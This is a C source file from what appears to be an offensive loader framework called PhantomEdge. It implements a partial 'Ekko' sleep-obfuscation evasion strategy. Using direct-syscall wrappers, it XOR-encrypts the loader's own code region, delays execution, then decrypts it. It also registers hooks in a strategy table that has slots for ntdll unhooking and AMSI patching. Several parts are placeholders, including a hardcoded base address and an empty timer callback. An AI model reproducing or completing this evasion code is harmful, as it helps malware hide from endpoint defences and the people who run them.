#include "../include/common_defines.h"
#include "../include/rtldr_ctx.h"
#include "../include/strategy.h"
#include "../include/utils.h"
#include "../include/syscalls.h"

// Based on the original Ekko sleep obfuscation technique by Cracked5pider
// Adapted for the PhantomEdge framework (No-CRT, direct syscalls)

// --- Private Functions ---

// Placeholder for encryption/decryption routine
// In a real scenario, this would be a more robust algorithm.
// For this PoC, we use a simple XOR.
static void XorMemory(PVOID pMemory, SIZE_T szMemory, BYTE bKey) {
    PBYTE pBytes = (PBYTE)pMemory;
    for (SIZE_T i = 0; i < szMemory; i++) {
        pBytes[i] ^= bKey;
    }
}

// The callback function that is executed by the timer.
// This function will perform the decryption, wait, and re-encryption.
VOID CALLBACK TimerCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired) {
    // This is a placeholder and will be replaced by a custom implementation
    // that uses NtContinue and crafted contexts.
    // For now, this demonstrates the timer functionality.
    
    // In the full implementation, lpParameter would contain the real context needed
    // for decryption, sleeping, and re-encryption.
}


// --- Public Strategy Function ---

BOOL Ekko_ObfuscateSleep(PRTLDR_CTX ctx, DWORD dwMilliseconds) {
    if (!ctx || !ctx->syscalls_initialized) {
        return FALSE;
    }

    // This is a simplified proof-of-concept for integration.
    // The full Ekko implementation requires creating a timer queue, setting a timer,
    // and passing carefully crafted CONTEXT structures to NtContinue.

    // 1. Get necessary function pointers (in a real scenario, these would be resolved dynamically)
    //    - RtlCreateTimerQueue
    //    - RtlCreateTimer
    //    - RtlDeleteTimerQueue
    
    // 2. Define memory region to encrypt (e.g., .text section of the loader)
    //    For this PoC, we will simulate this.
    PVOID pLoaderBase = (PVOID)0x140000000; // Placeholder base address
    SIZE_T szLoaderText = 0x1000; // Placeholder size
    BYTE bXorKey = 0x42;
    NTSTATUS status;
    
    // 3. Encrypt the memory region
    //    - Change memory permissions to RW
    //    - Encrypt
    //    - Change memory permissions back to RX (or NoAccess)
    
    ULONG ulOldProtect;
    status = wrapped_NtProtectVirtualMemory(NtCurrentProcess(), &pLoaderBase, &szLoaderText, PAGE_READWRITE, &ulOldProtect);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    XorMemory(pLoaderBase, szLoaderText, bXorKey);

    status = wrapped_NtProtectVirtualMemory(NtCurrentProcess(), &pLoaderBase, &szLoaderText, PAGE_EXECUTE_READ, &ulOldProtect);
    if (!NT_SUCCESS(status)) {
        // Attempt to revert if failed
        XorMemory(pLoaderBase, szLoaderText, bXorKey);
        return FALSE;
    }

    // 4. Sleep using a non-suspicious method (the core of Ekko)
    //    This is where the timer queue logic would go.
    //    For now, we'll use a simple syscall delay to test the framework.
    LARGE_INTEGER liDelay;
    liDelay.QuadPart = -( (long long)dwMilliseconds * 10000 ); // Convert ms to 100-nanosecond intervals, and make it relative
    
    wrapped_NtDelayExecution(FALSE, &liDelay);


    // 5. Decrypt the memory region
    //    - Change memory permissions to RW
    //    - Decrypt
    //    - Change memory permissions back to RX

    status = wrapped_NtProtectVirtualMemory(NtCurrentProcess(), &pLoaderBase, &szLoaderText, PAGE_READWRITE, &ulOldProtect);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    XorMemory(pLoaderBase, szLoaderText, bXorKey);

    status = wrapped_NtProtectVirtualMemory(NtCurrentProcess(), &pLoaderBase, &szLoaderText, PAGE_EXECUTE_READ, &ulOldProtect);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    
    return TRUE;
}

// Ekko strategy private data
typedef struct _EKKO_DATA {
    BYTE bXorKey;
    PVOID pCodeBase;
    SIZE_T uCodeSize;
} EKKO_DATA, *PEKKO_DATA;

// Ekko strategy initialization
static BOOL Ekko_Initialize(PRTLDR_CTX ctx) {
    PEKKO_DATA ekko_data = NULL;
    
    if (!ctx) {
        return FALSE;
    }
    
    // Allocate strategy data
    ekko_data = (PEKKO_DATA)ctx->mem_alloc(sizeof(EKKO_DATA));
    if (!ekko_data) {
        return FALSE;
    }
    
    // Initialize Ekko data
    ekko_data->bXorKey = 0x42; // Simple XOR key
    ekko_data->pCodeBase = (PVOID)0x140000000; // Will be updated with real base
    ekko_data->uCodeSize = 0x1000; // Will be updated with real size
    
    // Store in context
    ctx->strategy_data = ekko_data;
    
    return TRUE;
}

// Ekko strategy cleanup
static BOOL Ekko_Cleanup(PRTLDR_CTX ctx) {
    if (!ctx) {
        return FALSE;
    }
    
    if (ctx->strategy_data && ctx->mem_free) {
        ctx->mem_free(ctx->strategy_data);
        ctx->strategy_data = NULL;
    }
    
    return TRUE;
}

// Ekko strategy loader
BOOL Strategy_LoadEkko(PEVASION_STRATEGY pStrategy) {
    if (!pStrategy) {
        return FALSE;
    }
    
    // Set strategy metadata
    pStrategy->szStrategyName = "Ekko";
    pStrategy->dwVersion = 1;
    pStrategy->type = STRATEGY_EKKO;
    
    // Set function pointers
    pStrategy->pfnInitialize = Ekko_Initialize;
    pStrategy->pfnObfuscateSleep = Ekko_ObfuscateSleep;
    pStrategy->pfnCleanup = Ekko_Cleanup;
    
    // Ekko doesn't implement unhooking or AMSI patching
    pStrategy->pfnUnhookNtdll = NULL;
    pStrategy->pfnPatchAMSI = NULL;
    
    return TRUE;
} 